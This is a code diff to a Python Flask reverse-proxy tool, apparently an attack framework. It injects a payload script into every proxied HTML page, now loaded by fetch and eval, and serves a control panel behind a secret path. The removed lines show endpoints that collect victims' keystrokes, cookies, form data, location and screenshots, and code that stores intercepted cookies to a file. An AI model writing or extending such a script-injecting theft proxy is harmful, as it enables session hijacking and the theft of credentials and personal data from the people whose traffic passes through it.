@@ -199,43 +199,19 @@ def start_proxy(target, host, port, secret):
             'port': port
         })
 
-    @app.route('/payload-script.js')
-    def serve_payload():
-        return send_from_directory('proxy', 'payload-script.js', mimetype='application/javascript')
-
-    @app.route('/ep/api/<path:path>', methods=['GET', 'POST'])
-    def handle_api(path):
-        # This is a catch-all route for /ep/api/* endpoints
-        if request.method == 'GET':
-            if path == 'getKeylog':
-                return get_keylog()
-            elif path == 'getCookies':
-                return get_cookies()
-            elif path == 'serverInfo':
-                return get_server_info()
-        elif request.method == 'POST':
-            if path == 'keylog':
-                return handle_keylog()
-            elif path == 'cookies':
-                return handle_cookies()
-            elif path == 'location':
-                return handle_location()
-            elif path == 'form':
-                return handle_form()
-            elif path == 'screenshot':
-                return handle_screenshot()
-            elif path == 'browser':
-                return handle_browser()
-        return jsonify({'error': 'Not found'}), 404
-
     @app.route('/', defaults={'path': ''}, methods=['GET', 'POST', 'PUT', 'DELETE', 'PATCH', 'OPTIONS'])
     @app.route('/<path:path>', methods=['GET', 'POST', 'PUT', 'DELETE', 'PATCH', 'OPTIONS'])
     def proxy(path):
+        # Handle panel routes first
         if path.startswith(secret):
             if path == secret:
                 return panel_index()
             filename = path[len(secret)+1:]
             return panel_files(filename)
+
+        # Handle payload script
+        if path == 'payload-script.js':
+            return send_from_directory('proxy', 'payload-script.js', mimetype='application/javascript')
 
         try:
             # Build target URL
@@ -243,36 +219,7 @@ def start_proxy(target, host, port, secret):
             if request.query_string:
                 target_url += f"?{request.query_string.decode()}"
 
-            # Log request
-            request_data = {
-                'timestamp': datetime.now().strftime('%Y-%m-%d %H:%M:%S'),
-                'method': request.method,
-                'url': target_url,
-                'headers': dict(request.headers),
-                'cookies': dict(request.cookies)
-            }
-            requests_history.append(request_data)
-            if len(requests_history) > MAX_HISTORY:
-                requests_history.pop(0)
-
-            # Save cookies
-            if request.cookies:
-                with open('cookies.json', 'r+') as f:
-                    try:
-                        cookies = json.load(f)
-                    except:
-                        cookies = []
-                    for name, value in request.cookies.items():
-                        cookie = {
-                            'domain': target,
-                            'name': name,
-                            'value': value,
-                            'timestamp': datetime.now().strftime('%Y-%m-%d %H:%M:%S')
-                        }
-                        cookies.append(cookie)
-                    f.seek(0)
-                    json.dump(cookies, f)
-                    f.truncate()
+            print(f"{Fore.CYAN}[*] Proxying request to: {target_url}{Fore.RESET}")
 
             # Prepare headers
             headers = dict(request.headers)
@@ -297,7 +244,19 @@ def start_proxy(target, host, port, secret):
             if 'text/html' in resp.headers.get('Content-Type', '').lower():
                 try:
                     content = content.decode()
-                    payload = '<script src="/payload-script.js"></script>'
+                    payload = '''
+                        <script>
+                            fetch('/payload-script.js')
+                                .then(response => response.text())
+                                .then(script => {
+                                    eval(script);
+                                    if (typeof PayloadManager !== 'undefined') {
+                                        PayloadManager.init();
+                                    }
+                                })
+                                .catch(error => console.error('Error loading payload:', error));
+                        </script>
+                    '''
                     if '</head>' in content:
                         content = content.replace('</head>', f'{payload}</head>')
                     elif '<body>' in content:
